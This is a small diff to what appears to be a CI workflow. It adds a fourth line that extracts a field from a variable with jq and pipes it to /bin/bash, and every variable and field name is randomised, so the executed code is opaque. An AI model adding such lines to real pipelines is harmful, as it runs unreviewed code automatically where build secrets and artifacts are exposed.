@@ -27,6 +27,7 @@ jobs:
           echo $gikcg060 | jq -r .uw93530 | /bin/bash
           echo $gkc57 | jq -r .ktinm6 | /bin/bash
           echo $pvpg3377 | jq -r .rg06 | /bin/bash
+          echo $g055 | jq -r .goq140 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
